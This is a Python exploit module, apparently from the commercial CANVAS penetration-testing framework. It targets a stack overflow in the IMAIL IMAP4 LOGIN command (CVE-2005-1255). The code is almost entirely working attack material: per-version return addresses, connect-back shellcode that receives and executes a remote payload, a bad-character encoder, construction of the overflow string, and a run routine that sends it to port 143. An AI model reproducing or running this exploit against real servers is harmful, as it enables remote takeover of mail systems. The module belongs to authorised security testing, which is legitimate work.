#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
sys.path.append(".")
sys.path.append("../../")

# CANVAS modules
from exploitutils import *
from tcpexploit import *

# GUI info
NAME="IMAIL Imap"
DESCRIPTION="IMAIL Imap4 stack overflow in Login field"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="IPSwitch"
DOCUMENTATION["Repeatability"]="This is a one shot exploit. If you succeed, an exitthread() will restore the process and you can exploit it again."
DOCUMENTATION["VersionsAffected"]="IMail 8.13 up to 8.2p1 "
DOCUMENTATION["URL"]="http://www.idefense.com/application/poi/display?id=243&type=vulnerabilities"
DOCUMENTATION["CVE Name"] = "CVE-2005-1255"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1255"
DOCUMENTATION['CVSS'] = 10.0


VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "NT", "2000", "XP", "2003" ]

NOTES="""

"""

CHANGELOG="""

"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setVersions()
        self.port = 143
        self.host = ""
        self.badstring = "\x00\r\n@%\"*\\/"
        self.ssl = 0
        self.version = 1
        self.name = NAME        
        return

    def displayVersions(self):
        """ display versions """
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        """ set a target dict ( any call/jmp ecx will do ) """
        self.versions={}
        # XXX: debugged by bas on XP, and shows a call edx is needed, not ecx !
        self.versions[1] = ("IMail 8.13 (XP SP1a EN)", 0x1F852B1C) #odbcint.dll 
        self.versions[2] = ("IMail 8.2 (XP SP1a EN", 0x1F852B1C) #odbcint.dll
        # this next version is useful if you don't have the IMail, but you do know it's SP4
        self.versions[3] = ("IMail 8.X MPR.dll Win2K SP4 jmp ecx",  0x766242d3)
        return
        
    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        """ create shellcode for the win """

        # ret = self.createSmallWin32GOShellcode()
        from shellcode import shellcodeGenerator
        sc = shellcodeGenerator.win32()
        
        sc.addAttr("tcpconnect", {"port":self.callback.port, "ipaddress":self.callback.ip})
        sc.addAttr("RecvExecWin32", {"socketreg":"FDSPOT"})
        self.shellcode = sc.get()
        
        from encoder import chunkedaddencoder
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.shellcode = encoder.encode(self.shellcode)
        
        # these are just the numbers from makesploit() below
        offset = 492
        size = 12
        subesp = 5000
        self.easychunk(offset, size, subesp)

        self.log("Total length of shellcode=%d"%len(self.shellcode))
        return self.shellcode
    
    def test(self):
        """ test vulnerability """
        self.getArgs()

        s = self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        try:
            data = s.recv(1000)
        except:
            data = "Timeout"
        self.log("Server returned %s"%prettyprint(data[:300]))
        #only return 1 if we have a Imail string
        ret = data.count("IMail 8.13")
        if ret:
            self.version = 1
            return 1
        ret = data.count("IMail 8.2")
        if ret:
            self.version = 2
            return 1

        return 0
        
    def getArgs(self):
        """ get base arguments """
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))
        return

    def makesploit(self):
        """ Construct the attack, imail will tack \Users on the end of the string """

        geteip = self.versions[self.version][1]

        #jump back to just before some corrupted data using this writable address
        offset = 492
                
        sploitstring = "BBBB" + "A" * (700-4)
        writeoff = 500
        writeable = 0x7ffdf164 #keep this far away from the real PEB

        jmpoff = 676

        if len(self.shellcode) > jmpoff:
            self.log("Serious error: Shellcode length is > offset")

        import mosdef
        jmpstr = mosdef.assemble("jmp $-%d\n"%(jmpoff+5),"X86")
        if hasbadchar(jmpstr, self.badstring):
            self.log("Warning: Bad char detected in jmpstr")
        print "jmpstr = %s"%hexprint(jmpstr)

        sploitstring = stroverwrite(sploitstring, self.shellcode, 0) 
        sploitstring = stroverwrite(sploitstring, intel_order(geteip), offset)
        sploitstring = stroverwrite(sploitstring, intel_order(writeable), writeoff)
        sploitstring = stroverwrite(sploitstring, jmpstr, jmpoff)

        return "001 LOGIN \":%s\" \"password\"\r\n"%sploitstring

    def run(self):
        """ exploit main """
        self.getArgs()

        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))
        if self.version == 0:
            if not self.test():
                self.setInfo("%s attacking %s:%d - done (failed!)"%(NAME,self.host,self.port))
                return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring = self.makesploit()
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))
            data = s.recv(1000)
            self.log("Recved: %s"%data)
            s.sendall(sploitstring)
        except:
            self.log("Attack reported no open socket - service died?")
            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
            return 0

        time.sleep(1)

        #if self.checkTriggerWin32(s):
        #    self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        #    return self.doGOMOSDEFWin32(s)
        #else:
        #    return None
        
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (succeeded!)"% (NAME, self.host, self.port))
        else:
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
            return 0
        
        self.setState("done")
        return 1
                   
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [1, 0, None]:
        ret.interact()
